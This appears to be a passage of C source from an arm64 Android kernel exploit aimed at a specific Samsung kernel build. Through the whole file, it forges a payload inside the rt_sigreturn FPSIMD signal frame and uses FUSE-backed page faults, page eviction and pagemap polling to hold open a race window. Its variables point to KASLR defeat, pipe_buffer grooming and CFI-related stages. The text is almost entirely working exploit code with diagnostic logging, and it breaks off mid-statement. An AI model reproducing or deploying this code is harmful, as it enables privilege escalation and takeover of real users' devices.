#include "common.h"
#include <time.h>
static double fops_elapsed_ms(struct timespec *ref) {
  struct timespec now;
  clock_gettime(CLOCK_MONOTONIC, &now);
  return (now.tv_sec - ref->tv_sec) * 1000.0 + (now.tv_nsec - ref->tv_nsec) / 1e6;
}
extern int pselect_custom_write;

#define PSELECT_CFI_ROUTE_ATTEMPTS 8
#define PSELECT_EXPECTED_READY 9

atomic_int cfi_stage_done;
ssize_t cfi_write_ret = -1;
ssize_t cfi_read_ret = -1;
ssize_t cfi_read_slot_ret = -1;
ssize_t cfi_owner_ret = -1;
ssize_t cfi_restore_ret = -1;
uint64_t fops_before;
uint64_t fops_after;
int cfi_attempts;
int pipe_stage_attempts;
int cfi_dirty_seen;
int cfi_last_step;
int cfi_last_errno;
int kaslr_done;
int kaslr_step;
uint64_t kaslr_fops_alias;
uint64_t kaslr_open_ptr;
uint64_t kaslr_ioctl_ptr;
uint64_t kaslr_mmap_ptr;
uint64_t kaslr_release_ptr;
uint64_t kaslr_show_fdinfo_ptr;
uint64_t kaslr_base;
uint64_t kaslr_slide;
uint64_t kaslr_expected_ioctl;
uint64_t kaslr_expected_mmap;
uint64_t kaslr_expected_release;
uint64_t kaslr_expected_show_fdinfo;
uint64_t slide_bootid_before;
uint64_t slide_bootid_after;
uint64_t slide_bootid_want;
ssize_t slide_bootid_restore_ret = -1;

static int route_delay_usec(int attempt) {
  if (active_offsets && active_offsets->sync_route) {
    if (active_offsets->rt_sigreturn_route) return 0;
    /* Rotate FOPS_DELAY_USEC by one step per route attempt. */
    static const int fops_delays[] = {70000, 60000, 80000,
                                      40000, 90000, 50000};
    static int sync_delay_counter;
    return fops_delays[sync_delay_counter++ % 6];
  }
  /* Let select() establish its stack frame before the PI walk. */
  if (pselect_custom_write == 2) {
    return PSELECT_ENTER_DELAY_USEC;
  }
  if (pselect_custom_write_enabled()) {
    static const int delays[] = {
      50000, 30000, 70000, 10000, 100000, 150000, 20000, 120000,
    };
    int count = (int)(sizeof(delays) / sizeof(delays[0]));
    return delays[(attempt - 1) % count];
  }
  return -1;
}

#if defined(__aarch64__)
static volatile sig_atomic_t sigreturn_handler_seen;
static volatile sig_atomic_t sigreturn_handler_error;
static volatile uint64_t sigreturn_handler_tick;
static volatile uint64_t sigreturn_return_tick;
static unsigned char sigreturn_waiter_payload[0x50];

/* G985F/arm64 rt_sigframe layout from the exact HYB1 kernel:
 *   ucontext       frame + 0x80
 *   uc_stack       frame + 0x90
 *   uc_sigmask     frame + 0xa8
 *   maximum frame  0x1250 bytes
 *
 * The FPSIMD record is arranged across an emulated-storage page boundary,
 * with the forged waiter wholly before the boundary.  An EXTRA context makes
 * the parser walk to a following page.  While that later FUSE fault is held,
 * a helper evicts the already-validated FPSIMD tail page.  restore_fpsimd then
 * copies the forged waiter and blocks on that tail page before returning. */
#define RTSIG_FRAME_UC_OFF 0x80UL
#define RTSIG_FRAME_STACK_OFF 0x90UL
#define RTSIG_FRAME_SIGMASK_OFF 0xa8UL
#define RTSIG_FRAME_MAX_SIZE 0x1268UL
#define RTSIG_ALTSTACK_TOP_MOD 0xe90UL
#define RTSIG_BACKING_LENGTH 0x20000UL
#define RTSIG_ALTSTACK_SIZE 0x10e90UL
#define RTSIG_LAUNCH_STACK_SIZE 0x10000UL
#define RTSIG_PARSER_PAGES 13UL

static volatile sig_atomic_t sigreturn_fault_mode;
static volatile sig_atomic_t sigreturn_fault_madvise_ret;
static volatile sig_atomic_t sigreturn_fault_madvise_errno;
static volatile uintptr_t sigreturn_fault_frame;
static volatile uintptr_t sigreturn_fault_fpsimd_page;
static volatile uintptr_t sigreturn_fault_parser_page;
static volatile uintptr_t sigreturn_fault_done_page;
static void *sigreturn_fault_mapping;
static size_t sigreturn_fault_mapping_len;
static int sigreturn_fault_fd = -1;
static int sigreturn_pagemap_fd = -1;
static void *sigreturn_launch_mapping;
static void *sigreturn_launch_top;
static stack_t sigreturn_fault_stack;
static stack_t sigreturn_saved_stack;
static const char *sigreturn_fault_backing;
static char sigreturn_fault_path[160];
static atomic_int sigreturn_fault_evict_go;
static atomic_int sigreturn_fault_armed;
static atomic_int sigreturn_fault_inflight;
static atomic_int sigreturn_fault_tail_evicted;
static atomic_int sigreturn_fault_tail_refault_seen;
static atomic_int sigreturn_fault_wchan_seen;
static atomic_uint_fast64_t sigreturn_fault_done_seen_tick;
static atomic_int sigreturn_fault_done_seen_inflight;
static atomic_int sigreturn_fault_done_seen_tail_present;
static volatile sig_atomic_t sigreturn_fault_evict_ret;
static volatile sig_atomic_t sigreturn_fault_evict_errno;
static volatile uint64_t sigreturn_fault_evict_tick;

static inline uint64_t read_cntvct(void);
static inline uint64_t read_cntfrq(void);

static int build_sigreturn_fault_chain(struct fpsimd_context *fpsimd) {
  uintptr_t start = (uintptr_t)fpsimd;
  uintptr_t payload_start = (uintptr_t)fpsimd->vregs +
                            active_offsets->rt_sigreturn_waiter_payload_off;
  uintptr_t payload_end = payload_start +
                          active_offsets->rt_sigreturn_waiter_size;
  uintptr_t fpsimd_end = start + sizeof(*fpsimd);
  uintptr_t tail_page = fpsimd_end & ~(uintptr_t)KS_PAGE_MASK;
  uintptr_t parser_page = tail_page + KS_PAGE_SIZE;
  /* Give the eviction helper a deterministic runway after the first parser
   * PTE appears.  HYB1 permits an extra signal-frame area up to 64 KiB; 13
   * ESR pages keep this frame below that bound while making it impossible for
   * the parser to reach restore_fpsimd before the one-shot tail eviction. */
  uintptr_t done_page = parser_page + RTSIG_PARSER_PAGES * KS_PAGE_SIZE;
  uintptr_t map = (uintptr_t)sigreturn_fault_mapping;

  if ((start & ~(uintptr_t)KS_PAGE_MASK) == tail_page ||
      payload_end > tail_page || fpsimd_end <= tail_page ||
      done_page + KS_PAGE_SIZE > map + sigreturn_fault_mapping_len)
    return 0;

  unsigned char *after = (unsigned char *)fpsimd + sizeof(*fpsimd);
  if (((uintptr_t)after & ~(uintptr_t)KS_PAGE_MASK) != tail_page ||
      (uintptr_t)after + sizeof(struct extra_context) +
          16 >= parser_page)
    return 0;

  struct extra_context *extra = (struct extra_context *)after;
  memset(extra, 0, sizeof(*extra));
  extra->head.magic = EXTRA_MAGIC;
  extra->head.size = sizeof(*extra);
  struct _aarch64_ctx *dummy =
      (struct _aarch64_ctx *)(after + sizeof(*extra));
  memset(dummy, 0, 16);
  unsigned char *extra_base = (unsigned char *)dummy + 16;
  extra->datap = (uint64_t)(uintptr_t)extra_base;
  extra->size = (uint32_t)((done_page + 16) -
                           (uintptr_t)extra_base);
  if ((extra->size & 15U) != 0) return 0;

  for (unsigned char *p = extra_base; (uintptr_t)p < done_page; p += 16) {
    struct _aarch64_ctx *ctx = (struct _aarch64_ctx *)p;
    ctx->magic = ESR_MAGIC;
    ctx->size = 16;
    memset(p + sizeof(*ctx), 0, 16 - sizeof(*ctx));
  }

  sigreturn_fault_fpsimd_page = tail_page;
  sigreturn_fault_parser_page = parser_page;
  sigreturn_fault_done_page = done_page;
  return 1;
}

static int sigreturn_pagemap_present(uintptr_t address) {
  uint64_t entry = 0;
  off_t offset = (off_t)((address >> PAGE_SHIFT) * sizeof(entry));
  ssize_t n = pread(sigreturn_pagemap_fd, &entry, sizeof(entry), offset);
  return n == (ssize_t)sizeof(entry) && (entry & (1ULL << 63));
}

__attribute__((naked, noreturn))
static void enter_rt_sigreturn(void *frame __attribute__((unused))) {
  __asm__ volatile(
      "mov sp, x0\n"
      "mov x8, #139\n"
      "svc #0\n"
      /* A valid rt_sigreturn never comes back.  If it does, terminate this
       * diagnostic instead of returning with the deliberately replaced SP. */
      "mov x0, #211\n"
      "mov x8, #94\n"
      "svc #0\n"
      "brk #0\n");
}

__attribute__((noreturn, noinline, used, visibility("hidden")))
void sigreturn_fault_trampoline(void *frame) {
  uintptr_t frame_addr = (uintptr_t)frame;
  uintptr_t page = sigreturn_fault_parser_page;
  uintptr_t map = (uintptr_t)sigreturn_fault_mapping;

  sigreturn_fault_frame = frame_addr;
  sigreturn_fault_madvise_ret = -1;
  sigreturn_fault_madvise_errno = 0;
  if (sigreturn_handler_error) {
    sigreturn_handler_error = 4;
  } else if (!map || page < map || page + KS_PAGE_SIZE >
                                  map + sigreturn_fault_mapping_len) {
    sigreturn_handler_error = 5;
  } else {
    /* Persist the parser runway in the FUSE backing file.  The following
     * zero-filled page is its terminating context.  Dropping all runway PTEs
     * gives the helper enough time to evict the FPSIMD tail exactly once;
     * the final page remains the consumer's exact progress checkpoint. */
    uintptr_t tail_page = sigreturn_fault_fpsimd_page;
    off_t tail_off = (off_t)(tail_page - map);
    off_t parser_off = (off_t)(page - map);
    size_t parser_len = sigreturn_fault_done_page - page;
    size_t fault_len = parser_len + KS_PAGE_SIZE;
    errno = 0;
    /* Signal delivery populated a private COW page.  Persist its exact tail
     * before eviction: otherwise the later fault can resolve from the sparse
     * backing-file hole as an immediate zero page, collapsing the verified
     * post-payload scheduling window. */
    ssize_t tail_wrote = pwrite(sigreturn_fault_fd, (void *)tail_page,
                                KS_PAGE_SIZE, tail_off);
    ssize_t parser_wrote = pwrite(sigreturn_fault_fd, (void *)page,
                                  parser_len, parser_off);
    if (tail_wrote != KS_PAGE_SIZE ||
        parser_wrote != (ssize_t)parser_len ||
        fdatasync(sigreturn_fault_fd) != 0) {
      sigreturn_handler_error = 8;
    }
    (void)posix_fadvise(sigreturn_fault_fd, (off_t)(page - map),
                       fault_len, POSIX_FADV_DONTNEED);
    errno = 0;
    int ret = sigreturn_handler_error ? -1 :
        madvise((void *)page, fault_len, MADV_DONTNEED);
    sigreturn_fault_madvise_ret = ret;
    sigreturn_fault_madvise_errno = errno;
    if (ret != 0 && !sigreturn_handler_error) sigreturn_handler_error = 6;
  }

  sigreturn_handler_tick = read_cntvct();
  atomic_store_explicit(&sigreturn_fault_inflight,
                        sigreturn_handler_error ? 0 : 1,
                        memory_order_release);
  atomic_store_explicit(&sigreturn_fault_armed,
                        sigreturn_handler_error ? -1 : 1,
                        memory_order_release);
  atomic_store_explicit(&sigreturn_fault_evict_go,
                        sigreturn_handler_error ? -1 : 1,
                        memory_order_release);
  enter_rt_sigreturn(frame);
}

__attribute__((naked, noreturn))
static void switch_to_sigreturn_launch_stack(
    void *new_sp __attribute__((unused)), void *frame __attribute__((unused))) {
  __asm__ volatile(
      "mov sp, x0\n"
      "mov x0, x1\n"
      "b sigreturn_fault_trampoline\n");
}

static inline uint64_t read_cntvct(void) {
  uint64_t value;
  __asm__ volatile("isb; mrs %0, cntvct_el0" : "=r"(value));
  return value;
}

static inline uint64_t read_cntfrq(void) {
  uint64_t value;
  __asm__ volatile("mrs %0, cntfrq_el0" : "=r"(value));
  return value;
}

static void rt_sigreturn_handler(int signo __attribute__((unused)),
                                 siginfo_t *info __attribute__((unused)),
                                 void *opaque) {
  ucontext_t *uc = (ucontext_t *)opaque;
  unsigned char *cursor = uc->uc_mcontext.__reserved;
  size_t left = sizeof(uc->uc_mcontext.__reserved);

  while (left >= sizeof(struct _aarch64_ctx)) {
    struct _aarch64_ctx *head = (struct _aarch64_ctx *)cursor;
    if (head->magic == 0 && head->size == 0) break;
    if (head->size < sizeof(*head) || head->size > left ||
        (head->size & 15U) != 0) {
      sigreturn_handler_error = 1;
      return;
    }
    if (head->magic == FPSIMD_MAGIC) {
      struct fpsimd_context *fpsimd = (struct fpsimd_context *)cursor;
      size_t payload_off = active_offsets
          ? active_offsets->rt_sigreturn_waiter_payload_off : 0;
      size_t payload_len = active_offsets
          ? active_offsets->rt_sigreturn_waiter_size : 0;
      if (head->size < sizeof(*fpsimd) || payload_len == 0 ||
          payload_len > sizeof(sigreturn_waiter_payload) ||
          payload_off > sizeof(fpsimd->vregs) ||
          payload_len > sizeof(fpsimd->vregs) - payload_off) {
        sigreturn_handler_error = 2;
        return;
      }
      unsigned char *dst = (unsigned char *)fpsimd->vregs + payload_off;
      for (size_t i = 0; i < payload_len; i++)
        dst[i] = sigreturn_waiter_payload[i];
      sigreturn_handler_seen = 1;
      if (sigreturn_fault_mode) {
        if (!build_sigreturn_fault_chain(fpsimd))
          sigreturn_handler_error = 7;
        void *frame = (unsigned char *)opaque - RTSIG_FRAME_UC_OFF;
        switch_to_sigreturn_launch_stack(sigreturn_launch_top, frame);
      }
      sigreturn_handler_tick = read_cntvct();
      return;
    }
    cursor += head->size;
    left -= head->size;
  }
  sigreturn_handler_error = 3;
}

int install_rt_sigreturn_handler(void) {
  if (!active_offsets || !active_offsets->rt_sigreturn_route ||
      active_offsets->rt_sigreturn_waiter_payload_off != 0xf0 ||
      active_offsets->rt_sigreturn_waiter_size != 0x50) {
    errno = EINVAL;
    return 0;
  }
  struct sigaction sa;
  memset(&sa, 0, sizeof(sa));
  sa.sa_sigaction = rt_sigreturn_handler;
  sa.sa_flags = SA_SIGINFO | (sigreturn_fault_mode ? SA_ONSTACK : 0);
  sigemptyset(&sa.sa_mask);
  if (sigaction(SIGUSR2, &sa, NULL) != 0) return 0;

  sigset_t unblocked;
  sigemptyset(&unblocked);
  sigaddset(&unblocked, SIGUSR2);
  if (pthread_sigmask(SIG_UNBLOCK, &unblocked, NULL) != 0) {
    errno = EINVAL;
    return 0;
  }
  return 1;
}

static int fire_rt_sigreturn_payload(void) {
  sigreturn_handler_seen = 0;
  sigreturn_handler_error = 0;
  sigreturn_handler_tick = 0;
  sigreturn_return_tick = 0;
  atomic_store(&sigreturn_fault_inflight, 0);
  atomic_store(&sigreturn_fault_tail_evicted, 0);
  errno = 0;
  long ret = syscall(SYS_tgkill, getpid(), syscall(SYS_gettid), SIGUSR2);
  sigreturn_return_tick = read_cntvct();
  atomic_store_explicit(&sigreturn_fault_inflight, 0, memory_order_release);
  if (ret != 0) return 0;
  return sigreturn_handler_seen && !sigreturn_handler_error;
}

static void *rt_sigreturn_fault_evict_thread(void *unused) {
  (void)unused;
  pin_to_core(CONSUMER_CORE + 1);
  int go;
  do {
    go = atomic_load_explicit(&sigreturn_fault_evict_go,
                              memory_order_acquire);
    if (!go) __asm__ volatile("yield" ::: "memory");
  } while (!go);
  if (go < 0) return NULL;

  uint64_t deadline = mono_ns() + 2000000000ULL;
  while (!sigreturn_pagemap_present(sigreturn_fault_parser_page) &&
         mono_ns() < deadline)
    __asm__ volatile("yield" ::: "memory");
  if (!sigreturn_pagemap_present(sigreturn_fault_parser_page)) {
    sigreturn_fault_evict_ret = -1;
    sigreturn_fault_evict_errno = ETIMEDOUT;
    return NULL;
  }
  uintptr_t page = sigreturn_fault_fpsimd_page;
  uintptr_t map = (uintptr_t)sigreturn_fault_mapping;
  (void)posix_fadvise(sigreturn_fault_fd, (off_t)(page - map),
                     KS_PAGE_SIZE, POSIX_FADV_DONTNEED);
  errno = 0;
  int ret = madvise((void *)page, KS_PAGE_SIZE, MADV_DONTNEED);
  sigreturn_fault_evict_tick = read_cntvct();
  sigreturn_fault_evict_ret = ret;
  sigreturn_fault_evict_errno = errno;
  /* A successful MADV_DONTNEED is not sufficient by itself: fail closed if
   * the old PTE is still resident.  The consumer uses its later transition
   * back to present as the unambiguous start of restore_fpsimd_context()'s
   * post-payload tail-page fault. */
  int evicted = ret == 0 && !sigreturn_pagemap_present(page);
  atomic_store_explicit(&sigreturn_fault_tail_evicted,
                        evicted ? 1 : -1, memory_order_release);
  return NULL;
}

static void *rt_sigreturn_fault_observer_thread(void *unused) {
  (void)unused;
  int core = active_offsets && active_offsets->consumer_core
               ? active_offsets->consumer_core : CONSUMER_CORE;
  pin_to_core((size_t)core);
  int armed;
  do {
    armed = atomic_load_explicit(&sigreturn_fault_armed,
                                 memory_order_acquire);
    if (!armed) __asm__ volatile("yield" ::: "memory");
  } while (!armed);
  if (armed < 0) return NULL;

  while (!sigreturn_pagemap_present(sigreturn_fault_done_page)) {
    if (atomic_load_explicit(&sigreturn_fault_inflight,
                             memory_order_acquire) <= 0)
      break;
    __asm__ volatile("yield" ::: "memory");
  }
  atomic_store_explicit(&sigreturn_fault_done_seen_inflight,
                        atomic_load_explicit(&sigreturn_fault_inflight,
                                             memory_order_acquire),
                        memory_order_release);
  atomic_store_explicit(&sigreturn_fault_done_seen_tail_present,
                        sigreturn_pagemap_present(
                            sigreturn_fault_fpsimd_page),
                        memory_order_release);
  atomic_store_explicit(&sigreturn_fault_done_seen_tick, read_cntvct(),
                        memory_order_release);
  return NULL;
}

static void rt_sigreturn_fault_log_consumer_state(const char *reason) {
  uintptr_t parser = sigreturn_fault_parser_page;
  uintptr_t done = sigreturn_fault_done_page;
  pr_info("rt_sigreturn consumer state reason=%s armed=%d evicted=%d "
          "inflight=%d parser=%d done=%d handler=%d evict=%d/%d\n",
          reason,
          atomic_load_explicit(&sigreturn_fault_armed, memory_order_acquire),
          atomic_load_explicit(&sigreturn_fault_tail_evicted,
                               memory_order_acquire),
          atomic_load_explicit(&sigreturn_fault_inflight,
                               memory_order_acquire),
          parser ? sigreturn_pagemap_present(parser) : 0,
          done ? sigreturn_pagemap_present(done) : 0,
          (int)sigreturn_handler_error,
          (int)sigreturn_fault_evict_ret,
          (int)sigreturn_fault_evict_errno);
}

int rt_sigreturn_fault_consumer_window(void) {
  char wchan_path[96];
  int target_tid = atomic_load_explicit(&waiter_tid, memory_order_acquire);
  snprintf(wchan_path, sizeof(wchan_path), "/proc/self/task/%d/wchan",
           target_tid);
  int wchan_fd = open(wchan_path, O_RDONLY | O_CLOEXEC);
  atomic_store(&sigreturn_fault_wchan_seen, 0);
  atomic_store(&sigreturn_fault_tail_refault_seen, 0);

  int armed;
  do {
    armed = atomic_load_explicit(&sigreturn_fault_armed,
                                 memory_order_acquire);
    if (!armed) __asm__ volatile("yield" ::: "memory");
  } while (!armed && !atomic_load(&punch_consume_stop));
  if (armed < 0 || atomic_load(&punch_consume_stop) || wchan_fd < 0) {
    rt_sigreturn_fault_log_consumer_state(wchan_fd < 0 ? "wchan-open" :
                                                        "arm-stop");
    if (wchan_fd >= 0) close(wchan_fd);
    return 0;
  }

  uint64_t deadline = mono_ns() + 2000000000ULL;
  while (mono_ns() < deadline) {
    int evicted = atomic_load_explicit(&sigreturn_fault_tail_evicted,
                                       memory_order_acquire);
    if (evicted < 0) {
      rt_sigreturn_fault_log_consumer_state("tail-evict");
      close(wchan_fd);
      return 0;
    }
    if (evicted > 0 && sigreturn_pagemap_present(sigreturn_fault_done_page)) {
      /* The terminating context page is now resident.  Require both sides
       * of the actual copy window immediately: rt_sigreturn is still in
       * flight and the evicted FPSIMD tail PTE is still absent.  Device
       * measurements leave only about 146--273 us after this observation;
       * even a nominal 250 us settling delay consumes the valid window. */
      if (atomic_load_explicit(&sigreturn_fault_inflight,
                               memory_order_acquire) > 0 &&
          !sigreturn_pagemap_present(sigreturn_fault_fpsimd_page)) {
        atomic_store_explicit(&sigreturn_fault_tail_refault_seen, 1,
                              memory_order_release);
        /* 2 denotes the page-state guard; 1 remains the wchan fallback. */
        atomic_store_explicit(&sigreturn_fault_wchan_seen, 2,
                              memory_order_release);
        return 1;
      }
      /* MADV_RANDOM plus POSIX_FADV_RANDOM disables the fault-around
       * readahead which previously made the done-page PTE visible while an
       * earlier parser fault was still blocked.  Once the done page is
       * present, the next file-backed wait is restore_fpsimd_context()'s
       * evicted tail page, after the forged waiter prefix was copied. */
      uint64_t fault_deadline = mono_ns() + 200000000ULL;
      while (mono_ns() < fault_deadline &&
             atomic_load_explicit(&sigreturn_fault_inflight,
                                  memory_order_acquire) > 0) {
        char wchan[96] = {0};
        ssize_t n = pread(wchan_fd, wchan, sizeof(wchan) - 1, 0);
        if (n > 0 && (strstr(wchan, "wait_on_page") ||
                      strstr(wchan, "fuse_") ||
                      strstr(wchan, "request_wait"))) {
          atomic_store_explicit(&sigreturn_fault_tail_refault_seen, 1,
                                memory_order_release);
          atomic_store_explicit(&sigreturn_fault_wchan_seen, 1,
                                memory_order_release);
          /* Keep the fd open across the punch: close(2) would spend part of
           * the bounded FUSE window in an unrelated syscall. */
          return 1;
        }
        __asm__ volatile("yield" ::: "memory");
      }
      close(wchan_fd);
      rt_sigreturn_fault_log_consumer_state("post-done-wchan");
      return 0;
    }
    __asm__ volatile("yield" ::: "memory");
  }
  rt_sigreturn_fault_log_consumer_state("window-timeout");
  close(wchan_fd);
  return 0;
}

int rt_sigreturn_fault_inflight_state(void) {
  return atomic_load_explicit(&sigreturn_fault_inflight,
                              memory_order_acquire);
}

int rt_sigreturn_fault_wchan_state(void) {
  return atomic_load_explicit(&sigreturn_fault_wchan_seen,
                              memory_order_acquire);
}

int rt_sigreturn_fault_tail_refault_state(void) {
  return atomic_load_explicit(&sigreturn_fault_tail_refault_seen,
                              memory_order_acquire);
}

int rt_sigreturn_route_selftest(void) {
  memset(sigreturn_waiter_payload, 0, sizeof(sigreturn_waiter_payload));
  pr_info("profile map page_offset=%016llx direct_end=%016llx vmemmap=%016llx/%016llx\n",
          (unsigned long long)DIRECT_MAP_BASE,
          (unsigned long long)DIRECT_MAP_END,
          (unsigned long long)VMEMMAP_START,
          (unsigned long long)VMEMMAP_END);
  pr_info("profile pipe slots=%u object=0x%x objs=%u cache_index=%u mm_stride=0x%x\n",
          (unsigned)PIPE_BUFFER_SLOTS, (unsigned)PIPE_OBJECT_SIZE,
          (unsigned)PIPE_OBJS_PER_SLAB, (unsigned)KMALLOC_PIPE_INDEX,
          active_offsets->pipe_mm_stride);
  pr_info("profile umh legacy=%d completion=0x%x pwq_active=0x%x/0x%x pool=0x%x/0x%x\n",
          active_offsets->umh_subprocess_legacy_4_19,
          active_offsets->umh_completion_size,
          (unsigned)PWQ_NR_ACTIVE_OFF, (unsigned)PWQ_MAX_ACTIVE_OFF,
          (unsigned)POOL_WORKLIST_OFF, (unsigned)POOL_NR_IDLE_OFF);
  if (!install_rt_sigreturn_handler()) {
    pr_error("rt_sigreturn-check handler install failed errno=%d\n", errno);
    return 0;
  }
  uint64_t samples[32];
  int ok = 1;
  for (size_t i = 0; i < sizeof(samples) / sizeof(samples[0]); i++) {
    if (!fire_rt_sigreturn_payload() ||
        sigreturn_return_tick <= sigreturn_handler_tick) {
      ok = 0;
      samples[i] = 0;
    } else {
      samples[i] = sigreturn_return_tick - sigreturn_handler_tick;
    }
  }
  for (size_t i = 1; i < sizeof(samples) / sizeof(samples[0]); i++) {
    uint64_t value = samples[i];
    size_t j = i;
    while (j && samples[j - 1] > value) {
      samples[j] = samples[j - 1];
      j--;
    }
    samples[j] = value;
  }
  uint64_t freq = read_cntfrq();
  pr_info("rt_sigreturn timing ticks min=%llu median=%llu max=%llu freq=%llu"
          " ns=%llu/%llu/%llu\n",
          (unsigned long long)samples[0],
          (unsigned long long)samples[16],
          (unsigned long long)samples[31],
          (unsigned long long)freq,
          (unsigned long long)(samples[0] * 1000000000ULL / freq),
          (unsigned long long)(samples[16] * 1000000000ULL / freq),
          (unsigned long long)(samples[31] * 1000000000ULL / freq));
  pr_info("rt_sigreturn-check signal=%d error=%d payload_off=0x%x size=0x%x\n",
          (int)sigreturn_handler_seen, (int)sigreturn_handler_error,
          active_offsets->rt_sigreturn_waiter_payload_off,
          active_offsets->rt_sigreturn_waiter_size);
  if (ok) pr_success("rt_sigreturn-check complete; signal frame restored cleanly\n");
  return ok;
}

static void cleanup_rt_sigreturn_fault_stack(void) {
  sigreturn_fault_mode = 0;
  atomic_store(&sigreturn_fault_armed, 0);
  if (sigreturn_fault_mapping) {
    (void)sigaltstack(&sigreturn_saved_stack, NULL);
    munmap(sigreturn_fault_mapping, sigreturn_fault_mapping_len);
  }
  if (sigreturn_launch_mapping)
    munmap(sigreturn_launch_mapping, RTSIG_LAUNCH_STACK_SIZE);
  if (sigreturn_fault_fd >= 0) close(sigreturn_fault_fd);
  if (sigreturn_pagemap_fd >= 0) close(sigreturn_pagemap_fd);
  if (sigreturn_fault_path[0]) (void)unlink(sigreturn_fault_path);
  sigreturn_fault_mapping = NULL;
  sigreturn_fault_mapping_len = 0;
  sigreturn_fault_fd = -1;
  sigreturn_pagemap_fd = -1;
  sigreturn_launch_mapping = NULL;
  sigreturn_launch_top = NULL;
  sigreturn_fault_backing = NULL;
  sigreturn_fault_path[0] = '\0';
}

static void *try_rt_sigreturn_backing(const char *directory, int *out_fd) {
  char path[160];
  snprintf(path, sizeof(path), "%s/.pompom-rtframe-%d", directory, getpid());
  int fd = open(path, O_RDWR | O_CREAT | O_EXCL | O_CLOEXEC, 0600);
  if (fd < 0) return MAP_FAILED;
  if (ftruncate(fd, RTSIG_BACKING_LENGTH) != 0) {
    (void)unlink(path);
    close(fd);
    return MAP_FAILED;
  }
  /* Keep each parser page as a real FUSE fault.  Sequential readahead can
   * populate the final parser page early and destroys its ordering value. */
  (void)posix_fadvise(fd, 0, RTSIG_BACKING_LENGTH, POSIX_FADV_RANDOM);
  void *mapping = mmap(NULL, RTSIG_BACKING_LENGTH, PROT_READ | PROT_WRITE,
                       MAP_PRIVATE, fd, 0);
  if (mapping == MAP_FAILED) {
    (void)unlink(path);
    close(fd);
    return MAP_FAILED;
  }
  if (madvise(mapping, RTSIG_BACKING_LENGTH, MADV_RANDOM) != 0) {
    munmap(mapping, RTSIG_BACKING_LENGTH);
    (void)unlink(path);
    close(fd);
    return MAP_FAILED;
  }
  /* Android's emulated-storage FUSE may reject later pwrite on an unlinked
   * handle.  Keep the hidden PID-scoped file until normal cleanup. */
  snprintf(sigreturn_fault_path, sizeof(sigreturn_fault_path), "%s", path);
  *out_fd = fd;
  return mapping;
}

static int prepare_rt_sigreturn_fault_stack(void) {
  int fd = -1;
  void *mapping = try_rt_sigreturn_backing("/sdcard/Download", &fd);
  if (mapping != MAP_FAILED) {
    sigreturn_fault_backing = "emulated-storage";
  } else {
    mapping = try_rt_sigreturn_backing("/data/local/tmp", &fd);
    if (mapping == MAP_FAILED) return 0;
    sigreturn_fault_backing = "data-local-tmp";
  }
  int pagemap_fd = open("/proc/self/pagemap", O_RDONLY | O_CLOEXEC);
  if (pagemap_fd < 0) {
    munmap(mapping, RTSIG_BACKING_LENGTH);
    close(fd);
    if (sigreturn_fault_path[0]) (void)unlink(sigreturn_fault_path);
    sigreturn_fault_path[0] = '\0';
    return 0;
  }
  void *launch = mmap(NULL, RTSIG_LAUNCH_STACK_SIZE, PROT_READ | PROT_WRITE,
                      MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
  if (launch == MAP_FAILED) {
    munmap(mapping, RTSIG_BACKING_LENGTH);
    close(pagemap_fd);
    close(fd);
    if (sigreturn_fault_path[0]) (void)unlink(sigreturn_fault_path);
    sigreturn_fault_path[0] = '\0';
    return 0;
  }

  sigreturn_fault_fd = fd;
  sigreturn_pagemap_fd = pagemap_fd;
  sigreturn_fault_mapping = mapping;
  sigreturn_fault_mapping_len = RTSIG_BACKING_LENGTH;
  sigreturn_launch_mapping = launch;
  sigreturn_launch_top = (void *)((uintptr_t)launch +
                                  RTSIG_LAUNCH_STACK_SIZE - 16);
  memset(&sigreturn_fault_stack, 0, sizeof(sigreturn_fault_stack));
  sigreturn_fault_stack.ss_sp = mapping;
  sigreturn_fault_stack.ss_size = RTSIG_ALTSTACK_SIZE;
  if ((((uintptr_t)mapping + sigreturn_fault_stack.ss_size) & KS_PAGE_MASK) !=
      RTSIG_ALTSTACK_TOP_MOD) {
    errno = EINVAL;
    cleanup_rt_sigreturn_fault_stack();
    return 0;
  }
  if (sigaltstack(&sigreturn_fault_stack, &sigreturn_saved_stack) != 0) {
    cleanup_rt_sigreturn_fault_stack();
    return 0;
  }
  return 1;
}

int rt_sigreturn_fault_selftest(void) {
  memset(sigreturn_waiter_payload, 0, sizeof(sigreturn_waiter_payload));
  if (!prepare_rt_sigreturn_fault_stack()) {
    pr_error("rt_sigreturn-fault stack setup failed errno=%d\n", errno);
    return 0;
  }
  sigreturn_fault_mode = 1;
  if (!install_rt_sigreturn_handler()) {
    pr_error("rt_sigreturn-fault handler install failed errno=%d\n", errno);
    cleanup_rt_sigreturn_fault_stack();
    return 0;
  }

  uint64_t samples[8];
  int ok = 1;
  for (size_t i = 0; i < sizeof(samples) / sizeof(samples[0]); i++) {
    atomic_store(&sigreturn_fault_evict_go, 0);
    atomic_store(&sigreturn_fault_tail_evicted, 0);
    sigreturn_fault_evict_ret = -1;
    sigreturn_fault_evict_errno = 0;
    sigreturn_fault_evict_tick = 0;
    atomic_store(&sigreturn_fault_done_seen_tick, 0);
    atomic_store(&sigreturn_fault_done_seen_inflight, -1);
    atomic_store(&sigreturn_fault_done_seen_tail_present, -1);
    pthread_t evict_thread;
    pthread_t observer_thread;
    int evict_ok = pthread_create(&evict_thread, NULL,
                                  rt_sigreturn_fault_evict_thread, NULL) == 0;
    int observer_ok = pthread_create(&observer_thread, NULL,
                                     rt_sigreturn_fault_observer_thread,
                                     NULL) == 0;
    int thread_ok = evict_ok && observer_ok;
    int stack_ok = thread_ok &&
                   sigaltstack(&sigreturn_fault_stack, NULL) == 0;
    int fire_ok = stack_ok && fire_rt_sigreturn_payload();
    if (!stack_ok)
      atomic_store_explicit(&sigreturn_fault_evict_go, -1,
                            memory_order_release);
    if (evict_ok) pthread_join(evict_thread, NULL);
    if (observer_ok) pthread_join(observer_thread, NULL);
    uint64_t done_tick = atomic_load_explicit(
        &sigreturn_fault_done_seen_tick, memory_order_acquire);
    int64_t done_to_return = done_tick && sigreturn_return_tick
        ? (int64_t)(sigreturn_return_tick - done_tick) : INT64_MIN;
    pr_info("rt_sigreturn-fault observer run=%zu done_to_return_ticks=%lld "
            "inflight=%d tail_present=%d\n",
            i, (long long)done_to_return,
            atomic_load_explicit(&sigreturn_fault_done_seen_inflight,
                                 memory_order_acquire),
            atomic_load_explicit(&sigreturn_fault_done_seen_tail_present,
                                 memory_order_acquire));
    if (!thread_ok || !stack_ok || !fire_ok ||
